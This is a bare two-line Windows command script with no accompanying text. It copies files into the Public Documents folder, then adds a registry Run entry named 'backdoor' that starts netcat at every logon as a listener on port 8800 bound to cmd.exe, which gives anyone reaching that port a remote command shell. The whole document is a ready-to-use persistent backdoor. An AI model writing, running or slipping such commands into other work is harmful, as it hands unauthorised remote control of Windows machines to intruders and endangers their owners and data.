copy *.* "C:\Users\Public\Documents
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "backdoor"  /t "REG_SZ" /d "C:\Users\Public\Documents\nc.exe -d -L -e cmd.exe -p 8800" 
